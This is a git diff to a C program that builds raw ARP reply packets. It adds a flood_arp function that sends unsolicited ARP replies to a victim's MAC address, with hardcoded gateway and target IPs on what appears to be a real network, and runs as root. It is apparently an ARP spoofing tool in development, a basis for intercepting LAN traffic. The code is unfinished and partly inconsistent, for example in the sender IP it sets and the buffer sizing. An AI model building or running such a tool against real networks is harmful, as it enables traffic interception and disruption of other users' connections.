@@ -23,17 +23,23 @@
 #include <sys/socket.h>
 #include <unistd.h>
 
-#define INTERFACE_NAME "enp0s31f6"
+//#define INTERFACE_NAME "enp0s31f6"
+#define INTERFACE_NAME "wlp2s0"
 
-#define GATEWAY_IP "192.168.0.1"
-#define TARGET_IP "192.168.0.4"
+//#define GATEWAY_IP "192.168.0.1"
+//#define TARGET_IP "192.168.0.4"
 //#define GATEWAY_IP "1.1.1.1"
 //#define TARGET_IP "8.8.8.8"
+#define GATEWAY_IP "142.232.49.6"
+#define TARGET_IP "142.232.48.123"
 
 unsigned char local_mac[6];
+int local_interface_index;
 
 unsigned char gateway_mac[6];
 unsigned char target_mac[6];
+
+uint32_t local_ip;
 
 uint32_t gateway_ip;
 uint32_t target_ip;
@@ -53,6 +59,22 @@ void get_local_mac(int sock) {
         printf("%02x", (unsigned char) s.ifr_addr.sa_data[i]);
     }
     printf("\n");
+
+    if (ioctl(sock, SIOCGIFADDR, &s)) {
+        perror("ioctl local ip");
+        exit(EXIT_FAILURE);
+    }
+
+    memcpy(&local_ip, &((struct sockaddr_in*) &s.ifr_addr)->sin_addr.s_addr, sizeof(uint32_t));
+    printf("Local IP address is: %08x\n", local_ip);
+
+    if (ioctl(sock, SIOCGIFINDEX, &s)) {
+        perror("ioctl local ip");
+        exit(EXIT_FAILURE);
+    }
+
+    local_interface_index = s.ifr_ifindex;
+    printf("Local interface index is: %08x\n", local_interface_index);
 }
 
 void ping_ip(const char* ip) {
@@ -111,6 +133,54 @@ int create_packet_socket(void) {
     return pack_sock;
 }
 
+void flood_arp(const int sock, const unsigned char* victim_mac, const uint32_t victim_ip) {
+    unsigned char buffer[sizeof(struct ether_arp) + sizeof(struct ether_arp)];
+    memset(buffer, 0, sizeof(struct ether_arp) + sizeof(struct ether_arp));
+
+    struct ether_header* eh = (struct ether_header*) buffer;
+    struct ether_arp* ea = (struct ether_arp*) (buffer + sizeof(struct ether_header));
+    //Set target mac address
+    memcpy(eh->ether_dhost, victim_mac, 6);
+    //Set sender mac address
+    memcpy(eh->ether_shost, local_mac, 6);
+    eh->ether_type = htons(ETH_P_ARP);
+
+    //Ethernet
+    ea->arp_hrd = htons(ARPHRD_ETHER);
+    //IPv4
+    ea->arp_pro = htons(ETH_P_IP);
+    //Hardware len
+    ea->arp_hln = ETHER_ADDR_LEN;
+    //Protocol len
+    ea->arp_pln = sizeof(in_addr_t);
+
+    //ARP reply
+    ea->arp_op = htons(ARPOP_REPLY);
+    //ea->arp_op = htons(2);
+
+    //Set sender mac address
+    memcpy(ea->arp_sha, local_mac, 6);
+
+    //Set sender IP address
+    memcpy(ea->arp_spa, &local_ip, 4);
+
+    //Set target mac address
+    memcpy(ea->arp_tha, victim_mac, 6);
+
+    //Set target IP address
+    memcpy(ea->arp_tpa, &victim_ip, 4);
+
+    struct sockaddr_ll addr = {0};
+    addr.sll_family = AF_PACKET;
+    addr.sll_ifindex = local_interface_index;
+    addr.sll_halen = ETHER_ADDR_LEN;
+    addr.sll_protocol = htons(ETH_P_ARP);
+    memcpy(addr.sll_addr, victim_mac, ETHER_ADDR_LEN);
+
+    sendto(sock, buffer, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
+            (struct sockaddr*) &addr, sizeof(struct sockaddr_ll));
+}
+
 int main(void) {
     if (setuid(0)) {
         perror("setuid");
@@ -148,16 +218,7 @@ int main(void) {
     printf("%02x %02x %02x %02x %02x %02x\n", target_mac[0], target_mac[1], target_mac[2],
             target_mac[3], target_mac[4], target_mac[5]);
 
-    struct ether_arp arp_packet;
-    arp_packet.arp_hrd = 0;
-    arp_packet.arp_pro = 0;
-    arp_packet.arp_hln = 0;
-    arp_packet.arp_pln = 0;
-    arp_packet.arp_op = 0;
-    arp_packet.arp_sha[0] = 0;
-    arp_packet.arp_spa[0] = 0;
-    arp_packet.arp_tha[0] = 0;
-    arp_packet.arp_tpa[0] = 0;
+    flood_arp(pack_sock, gateway_mac, gateway_ip);
 
     return EXIT_SUCCESS;
 }
